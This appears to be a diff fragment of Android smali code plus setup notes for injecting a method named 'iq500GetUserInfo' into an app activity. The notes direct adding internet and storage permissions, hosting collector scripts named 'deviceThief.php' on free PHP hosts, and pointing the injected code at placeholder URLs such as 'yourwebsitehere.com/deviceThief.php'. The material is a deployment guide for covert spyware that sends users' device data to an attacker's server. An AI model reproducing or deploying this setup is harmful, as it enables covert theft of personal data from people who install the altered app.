@@ -1,1 +1,24 @@
 invoke-direct {p0}, L[Insert activity here];->iq500GetUserInfo()V
+
+Notes:
+You need to insert the following permissions to AndroidManifest.xml (if have not):
+1. android.permission.INTERNET
+2. android.permission.READ_EXTERNAL_STORAGE
+
+Also, get your own website supports php ready, get a copy of the website materials that handle the data from my github.
+The materials contain:
+1. deviceThief.php
+2. deviceThief2.php
+3. deviceTheif3.php
+4. deviceThief.txt (output file, cleans up the file itself when size exceeded 500 KB as default, you may change the limitation in deviceThief.php)
+
+Recommended free hosting website: 000webhost, awardspace (support php and ftp)
+After registered for a domain, it is suggested to upload the above files to the root directory.
+
+Last but not least, you must change the urls declared in the method.
+
+To ensure the correctness, please paste the method to the code editor first then use "find and replace" feature.
+Find the following strings: 
+"http://yourwebsitehere.com/deviceThief.php"
+"http://yourwebsitehere.com/deviceThief2.php"
+"http://yourwebsitehere.com/deviceThief3.php"
